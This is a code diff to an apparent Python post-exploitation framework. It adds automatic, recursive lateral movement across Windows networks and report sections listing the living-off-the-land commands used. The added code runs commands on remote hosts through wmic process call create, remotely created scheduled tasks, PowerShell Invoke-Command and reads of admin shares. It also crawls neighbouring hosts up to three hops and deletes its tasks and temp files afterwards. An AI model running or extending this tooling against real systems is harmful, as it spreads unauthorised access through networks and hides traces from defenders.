@@ -2,6 +2,7 @@
 
 import json
 import time
+import re
 from datetime import datetime
 from typing import Dict, List, Any, Optional
 from rich.console import Console
@@ -13,7 +14,7 @@ from modules.utils import execute_cmd, execute_powershell, validate_target
 
 
 class AutoEnumerator:
-    """Automated enumeration engine"""
+    """Automated enumeration engine with automatic lateral movement"""
     
     def __init__(self, console: Console, session_data: dict):
         self.console = console
@@ -28,19 +29,35 @@ class AutoEnumerator:
             'lateral_targets': [],
             'persistence': {},
             'certificates': {},
-            'lolbins_used': []
+            'lolbins_used': [],
+            'lateral_paths': []  # Track lateral movement paths
         }
         self.lab_use = session_data.get('LAB_USE', 0)
+        self.max_depth = 3  # Maximum lateral movement depth
+        self.visited_hosts = set()  # Track visited hosts to avoid loops
+        self.lateral_path = []  # Current lateral movement path
     
     def run_full_enumeration(self) -> Dict[str, Any]:
         """Run complete enumeration across all modules"""
         self.console.print(Panel(
             "[bold]AUTO-ENUMERATION MODE[/bold]\n\n"
-            "Running comprehensive enumeration across all modules...",
+            "Running comprehensive enumeration across all modules...\n"
+            f"Maximum lateral movement depth: {self.max_depth}",
             title="Auto-Enumeration",
             border_style="cyan"
         ))
         self.console.print()
+        
+        # Get initial hostname/IP to track
+        try:
+            exit_code, stdout, stderr = execute_cmd("hostname", lab_use=self.lab_use)
+            if exit_code == 0:
+                initial_host = stdout.strip()
+                self.visited_hosts.add(initial_host)
+                self.lateral_path.append(initial_host)
+                self.enumeration_data['initial_host'] = initial_host
+        except Exception:
+            pass
         
         with Progress(
             SpinnerColumn(),
@@ -68,7 +85,12 @@ class AutoEnumerator:
             
             # Lateral movement targets
             task5 = progress.add_task("[cyan]Lateral Movement Targets...", total=100)
-            self._enumerate_lateral_targets(progress, task5)
+            lateral_targets = self._enumerate_lateral_targets(progress, task5)
+            
+            # Automatic lateral movement
+            if lateral_targets:
+                task5b = progress.add_task("[cyan]Automatic Lateral Movement...", total=100)
+                self._perform_automatic_lateral_movement(progress, task5b, lateral_targets)
             
             # Persistence enumeration
             task6 = progress.add_task("[cyan]Persistence Mechanisms...", total=100)
@@ -317,9 +339,283 @@ class AutoEnumerator:
                 tested_targets.append(target)
             
             progress.update(task, advance=70, description="[green]Lateral targets enumeration complete")
+            
+            return self.enumeration_data['lateral_targets']
         
         except Exception as e:
             self.enumeration_data['lateral_targets'] = {'error': str(e)}
+            return []
+    
+    def _perform_automatic_lateral_movement(self, progress, task, targets: List[Dict[str, Any]], depth: int = 0):
+        """Automatically perform lateral movement using LOTL techniques"""
+        if depth >= self.max_depth:
+            progress.update(task, advance=100, description=f"[yellow]Maximum depth ({self.max_depth}) reached")
+            return
+        
+        accessible_targets = []
+        for target_info in targets:
+            if not isinstance(target_info, dict):
+                continue
+            
+            target = target_info.get('target')
+            if not target or target in self.visited_hosts:
+                continue
+            
+            # Check if target is accessible
+            smb_accessible = target_info.get('smb_accessible', False)
+            winrm_accessible = target_info.get('winrm_accessible', False)
+            
+            if smb_accessible or winrm_accessible:
+                accessible_targets.append({
+                    'target': target,
+                    'smb': smb_accessible,
+                    'winrm': winrm_accessible,
+                    'depth': depth
+                })
+        
+        if not accessible_targets:
+            progress.update(task, advance=100, description="[yellow]No accessible targets found")
+            return
+        
+        # Limit to first 3 accessible targets per depth
+        accessible_targets = accessible_targets[:3]
+        
+        progress.update(task, advance=10, description=f"[cyan]Found {len(accessible_targets)} accessible target(s) at depth {depth}")
+        
+        for target_info in accessible_targets:
+            target = target_info['target']
+            self.visited_hosts.add(target)
+            self.lateral_path.append(target)
+            
+            try:
+                progress.update(task, advance=5, description=f"[cyan]Enumerating {target} (depth {depth})...")
+                
+                # Enumerate remote target
+                remote_data = self._enumerate_remote_target(target, target_info, depth)
+                
+                # Store lateral path
+                path_entry = {
+                    'path': self.lateral_path.copy(),
+                    'depth': depth,
+                    'target': target,
+                    'method': 'wmic' if target_info.get('winrm') else 'smb',
+                    'enumeration': remote_data
+                }
+                self.enumeration_data['lateral_paths'].append(path_entry)
+                
+                # Check for further lateral movement opportunities from this target
+                if depth < self.max_depth - 1:
+                    # Discover targets from remote machine
+                    progress.update(task, advance=5, description=f"[cyan]Discovering targets from {target}...")
+                    remote_targets = self._discover_remote_targets(target, target_info)
+                    if remote_targets:
+                        progress.update(task, advance=5, description=f"[cyan]Found {len(remote_targets)} targets from {target}, moving laterally...")
+                        # Recursive lateral movement
+                        self._perform_automatic_lateral_movement(progress, task, remote_targets, depth + 1)
+                    else:
+                        progress.update(task, advance=5, description=f"[dim]No new targets from {target}[/dim]")
+                
+                # Remove from path after enumeration
+                if self.lateral_path and self.lateral_path[-1] == target:
+                    self.lateral_path.pop()
+            
+            except Exception as e:
+                self.console.print(f"[red]Error enumerating {target}: {e}[/red]")
+                if self.lateral_path and self.lateral_path[-1] == target:
+                    self.lateral_path.pop()
+        
+        progress.update(task, advance=100, description="[green]Lateral movement complete")
+    
+    def _enumerate_remote_target(self, target: str, target_info: Dict[str, Any], depth: int) -> Dict[str, Any]:
+        """Enumerate a remote target using LOTL techniques"""
+        remote_data = {
+            'target': target,
+            'depth': depth,
+            'identity': {},
+            'network': {},
+            'system_info': {},
+            'shares': []
+        }
+        
+        try:
+            # Choose method based on availability
+            use_wmic = target_info.get('winrm', False)
+            use_smb = target_info.get('smb', False)
+            
+            if use_wmic:
+                # Use WMI for remote enumeration (LOTL)
+                # System info
+                wmic_cmd = f'wmic /node:{target} os get name,version'
+                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
+                if exit_code == 0:
+                    remote_data['system_info']['os'] = stdout[:200]
+                    self.enumeration_data['lolbins_used'].append(f'wmic /node:{target} os get')
+                
+                # Process list
+                wmic_cmd = f'wmic /node:{target} process list brief'
+                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
+                if exit_code == 0:
+                    remote_data['system_info']['processes'] = stdout[:300]
+                    self.enumeration_data['lolbins_used'].append(f'wmic /node:{target} process list')
+                
+                # Network shares via WMI
+                ps_cmd = f'Get-WmiObject -Class Win32_Share -ComputerName {target} | Select-Object Name, Path'
+                exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
+                if exit_code == 0:
+                    remote_data['network']['shares'] = stdout[:200]
+                    self.enumeration_data['lolbins_used'].append(f'Get-WmiObject Win32_Share -ComputerName {target}')
+                
+                # Execute whoami remotely
+                wmic_cmd = f'wmic /node:{target} process call create "whoami"'
+                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
+                if exit_code == 0:
+                    remote_data['identity']['whoami_executed'] = True
+                    self.enumeration_data['lolbins_used'].append(f'wmic /node:{target} process call create')
+            
+            elif use_smb:
+                # Use SMB for remote enumeration (LOTL)
+                # List shares
+                smb_cmd = f'net view \\\\{target}'
+                exit_code, stdout, stderr = execute_cmd(smb_cmd, lab_use=self.lab_use)
+                if exit_code == 0:
+                    remote_data['network']['shares'] = stdout[:200]
+                    # Parse shares
+                    shares = []
+                    for line in stdout.split('\n'):
+                        if 'Disk' in line or 'Print' in line:
+                            parts = line.split()
+                            if parts:
+                                shares.append(parts[0])
+                    remote_data['shares'] = shares[:10]
+                    self.enumeration_data['lolbins_used'].append(f'net view \\\\{target}')
+                
+                # Execute command via scheduled task (LOTL)
+                task_name = f"EnumTask_{int(time.time())}"
+                cmd = 'whoami > C:\\Windows\\Temp\\enum_result.txt'
+                
+                # Create task
+                create_cmd = f'schtasks /create /s {target} /tn {task_name} /tr "cmd.exe /c {cmd}" /sc once /st 00:00 /f'
+                exit_code, stdout, stderr = execute_cmd(create_cmd, lab_use=self.lab_use)
+                
+                if exit_code == 0:
+                    self.enumeration_data['lolbins_used'].append(f'schtasks /create /s {target}')
+                    
+                    # Run task
+                    run_cmd = f'schtasks /run /s {target} /tn {task_name}'
+                    execute_cmd(run_cmd, lab_use=self.lab_use)
+                    self.enumeration_data['lolbins_used'].append(f'schtasks /run /s {target}')
+                    
+                    time.sleep(2)  # Wait for execution
+                    
+                    # Try to read result via SMB
+                    read_cmd = f'type \\\\{target}\\C$\\Windows\\Temp\\enum_result.txt'
+                    exit_code, stdout, stderr = execute_cmd(read_cmd, lab_use=self.lab_use)
+                    if exit_code == 0:
+                        remote_data['identity']['whoami'] = stdout.strip()
+                    
+                    # Clean up task
+                    delete_cmd = f'schtasks /delete /s {target} /tn {task_name} /f'
+                    execute_cmd(delete_cmd, lab_use=self.lab_use)
+                    self.enumeration_data['lolbins_used'].append(f'schtasks /delete /s {target}')
+                    
+                    # Clean up temp file
+                    del_cmd = f'del \\\\{target}\\C$\\Windows\\Temp\\enum_result.txt'
+                    execute_cmd(del_cmd, lab_use=self.lab_use)
+        
+        except Exception as e:
+            remote_data['error'] = str(e)
+        
+        return remote_data
+    
+    def _discover_remote_targets(self, target: str, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
+        """Discover targets from a remote machine using LOTL"""
+        remote_targets = []
+        
+        try:
+            use_wmic = target_info.get('winrm', False)
+            use_smb = target_info.get('smb', False)
+            
+            if use_wmic:
+                # Use WMI to execute net view on remote machine
+                # Execute net view via WMI
+                wmic_cmd = f'wmic /node:{target} process call create "net view /domain"'
+                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
+                if exit_code == 0:
+                    self.enumeration_data['lolbins_used'].append(f'wmic /node:{target} process call create "net view"')
+                
+                # Use PowerShell remoting to get network info
+                ps_cmd = f'Invoke-Command -ComputerName {target} -ScriptBlock {{ Get-NetNeighbor | Select-Object -First 10 IPAddress }}'
+                exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
+                if exit_code == 0:
+                    # Parse IPs from output
+                    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
+                    ips = re.findall(ip_pattern, stdout)
+                    is_local_ip = self.session_data.get('is_local_ip', lambda x: False)
+                    local_ips = [ip for ip in ips if is_local_ip(ip)]
+                    
+                    for ip in local_ips[:5]:
+                        if ip not in self.visited_hosts and ip != target:
+                            remote_targets.append({
+                                'target': ip,
+                                'smb_accessible': False,  # Will test
+                                'winrm_accessible': False
+                            })
+            
+            elif use_smb:
+                # Use net view from remote machine via SMB
+                # Execute net view via scheduled task
+                task_name = f"NetViewTask_{int(time.time())}"
+                cmd = 'net view /domain > C:\\Windows\\Temp\\netview_result.txt'
+                
+                create_cmd = f'schtasks /create /s {target} /tn {task_name} /tr "cmd.exe /c {cmd}" /sc once /st 00:00 /f'
+                exit_code, stdout, stderr = execute_cmd(create_cmd, lab_use=self.lab_use)
+                
+                if exit_code == 0:
+                    self.enumeration_data['lolbins_used'].append(f'schtasks /create /s {target} (net view)')
+                    
+                    # Run and wait
+                    run_cmd = f'schtasks /run /s {target} /tn {task_name}'
+                    execute_cmd(run_cmd, lab_use=self.lab_use)
+                    time.sleep(2)
+                    
+                    # Read result via SMB
+                    read_cmd = f'type \\\\{target}\\C$\\Windows\\Temp\\netview_result.txt'
+                    exit_code, stdout, stderr = execute_cmd(read_cmd, lab_use=self.lab_use)
+                    
+                    if exit_code == 0:
+                        # Parse computer names/IPs
+                        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
+                        ips = re.findall(ip_pattern, stdout)
+                        is_local_ip = self.session_data.get('is_local_ip', lambda x: False)
+                        local_ips = [ip for ip in ips if is_local_ip(ip)]
+                        
+                        # Also look for computer names
+                        hostname_pattern = r'\\\\[A-Za-z0-9\-]+'
+                        hostnames = re.findall(hostname_pattern, stdout)
+                        hostnames = [h.replace('\\\\', '') for h in hostnames]
+                        
+                        # Test connectivity to discovered targets
+                        for ip in local_ips[:5]:
+                            if ip not in self.visited_hosts and ip != target:
+                                test_cmd = f'net view \\\\{ip}'
+                                test_exit, _, _ = execute_cmd(test_cmd, lab_use=self.lab_use)
+                                if test_exit == 0:
+                                    remote_targets.append({
+                                        'target': ip,
+                                        'smb_accessible': True,
+                                        'winrm_accessible': False
+                                    })
+                    
+                    # Cleanup
+                    delete_cmd = f'schtasks /delete /s {target} /tn {task_name} /f'
+                    execute_cmd(delete_cmd, lab_use=self.lab_use)
+                    del_cmd = f'del \\\\{target}\\C$\\Windows\\Temp\\netview_result.txt'
+                    execute_cmd(del_cmd, lab_use=self.lab_use)
+        
+        except Exception as e:
+            self.console.print(f"[dim]Error discovering targets from {target}: {e}[/dim]")
+        
+        return remote_targets
     
     def _enumerate_persistence(self, progress, task):
         """Enumerate persistence mechanisms"""
@@ -401,6 +697,12 @@ class ReportGenerator:
         report.append("=" * 80)
         report.append("")
         
+        # Initial Host
+        report.append("INITIAL FOOTHOLD")
+        report.append("-" * 80)
+        report.append(f"Initial Host: {self.data.get('initial_host', 'Unknown')}")
+        report.append("")
+        
         # Foothold
         report.append("FOOTHOLD ASSESSMENT")
         report.append("-" * 80)
@@ -467,6 +769,75 @@ class ReportGenerator:
                 report.append("Potential Targets: 0")
         else:
             report.append("Potential Targets: 0")
+        report.append("")
+        
+        # Lateral Movement Paths
+        report.append("AUTOMATIC LATERAL MOVEMENT PATHS")
+        report.append("-" * 80)
+        if 'lateral_paths' in self.data:
+            paths = self.data['lateral_paths']
+            if isinstance(paths, list) and paths:
+                report.append(f"Lateral Movement Paths: {len(paths)}")
+                report.append(f"Maximum Depth Reached: {max([p.get('depth', 0) for p in paths] + [0])}")
+                report.append("")
+                for i, path_info in enumerate(paths, 1):
+                    if isinstance(path_info, dict):
+                        path = path_info.get('path', [])
+                        depth = path_info.get('depth', 0)
+                        method = path_info.get('method', 'unknown')
+                        target = path_info.get('target', 'Unknown')
+                        report.append(f"Path {i}: {' -> '.join(path)}")
+                        report.append(f"  Depth: {depth}")
+                        report.append(f"  Method: {method}")
+                        enum = path_info.get('enumeration', {})
+                        if enum.get('system_info', {}).get('os'):
+                            report.append(f"  OS: {enum['system_info']['os'][:50]}")
+                        if enum.get('shares'):
+                            report.append(f"  Shares: {len(enum['shares'])} found")
+                        report.append("")
+            else:
+                report.append("Lateral Movement Paths: 0")
+        else:
+            report.append("Lateral Movement Paths: 0")
+        report.append("")
+        
+        # LOTL Techniques Used
+        report.append("LOTL TECHNIQUES USED")
+        report.append("-" * 80)
+        if 'lolbins_used' in self.data:
+            lolbins = self.data['lolbins_used']
+            report.append(f"LOTL Commands Executed: {len(lolbins)}")
+            report.append("")
+            
+            # Group by technique
+            wmic_cmds = [c for c in lolbins if 'wmic' in c.lower()]
+            schtasks_cmds = [c for c in lolbins if 'schtasks' in c.lower()]
+            net_cmds = [c for c in lolbins if 'net view' in c.lower() or 'net share' in c.lower()]
+            ps_cmds = [c for c in lolbins if 'powershell' in c.lower() or 'invoke' in c.lower()]
+            
+            if wmic_cmds:
+                report.append(f"WMI Commands ({len(wmic_cmds)}):")
+                for cmd in wmic_cmds[:10]:
+                    report.append(f"  - {cmd}")
+                report.append("")
+            
+            if schtasks_cmds:
+                report.append(f"Scheduled Task Commands ({len(schtasks_cmds)}):")
+                for cmd in schtasks_cmds[:10]:
+                    report.append(f"  - {cmd}")
+                report.append("")
+            
+            if net_cmds:
+                report.append(f"Net Commands ({len(net_cmds)}):")
+                for cmd in net_cmds[:10]:
+                    report.append(f"  - {cmd}")
+                report.append("")
+            
+            if ps_cmds:
+                report.append(f"PowerShell Remoting ({len(ps_cmds)}):")
+                for cmd in ps_cmds[:10]:
+                    report.append(f"  - {cmd}")
+                report.append("")
         report.append("")
         
         # Persistence
@@ -544,6 +915,36 @@ class ReportGenerator:
             else:
                 html.append("<p>No targets found</p>")
         
+        # Lateral Movement Paths
+        html.append("<h2>Automatic Lateral Movement Paths</h2>")
+        if 'lateral_paths' in self.data:
+            paths = self.data['lateral_paths']
+            if paths:
+                html.append("<table><tr><th>Path</th><th>Depth</th><th>Method</th><th>Details</th></tr>")
+                for path_info in paths:
+                    if isinstance(path_info, dict):
+                        path = path_info.get('path', [])
+                        depth = path_info.get('depth', 0)
+                        method = path_info.get('method', 'unknown')
+                        html.append(f"<tr><td>{' -> '.join(path)}</td>")
+                        html.append(f"<td>{depth}</td>")
+                        html.append(f"<td>{method}</td>")
+                        enum = path_info.get('enumeration', {})
+                        html.append(f"<td>OS: {enum.get('system_info', {}).get('os', 'Unknown')[:30]}</td></tr>")
+                html.append("</table>")
+            else:
+                html.append("<p>No lateral movement performed</p>")
+        
+        # LOTL Techniques
+        html.append("<h2>LOTL Techniques Used</h2>")
+        if 'lolbins_used' in self.data:
+            lolbins = self.data['lolbins_used']
+            html.append(f"<p><strong>Total LOTL Commands:</strong> {len(lolbins)}</p>")
+            html.append("<ul>")
+            for cmd in lolbins[:20]:
+                html.append(f"<li>{cmd}</li>")
+            html.append("</ul>")
+        
         html.append("</body></html>")
         return '\n'.join(html)
     
@@ -578,6 +979,16 @@ class ReportGenerator:
         targets = self.data.get('lateral_targets', [])
         target_count = len(targets) if isinstance(targets, list) else 0
         table.add_row("Lateral Targets", "Complete", f"{target_count} targets")
+        
+        # Lateral Movement Paths
+        paths = self.data.get('lateral_paths', [])
+        path_count = len(paths) if isinstance(paths, list) else 0
+        max_depth = max([p.get('depth', 0) for p in paths] + [0]) if paths and isinstance(paths, list) else 0
+        table.add_row("Lateral Movement", "Complete", f"{path_count} paths (max depth: {max_depth})")
+        
+        # LOTL Techniques
+        lolbins = self.data.get('lolbins_used', [])
+        table.add_row("LOTL Techniques", "Complete", f"{len(lolbins)} commands executed")
         
         # Persistence
         persist = self.data.get('persistence', {})
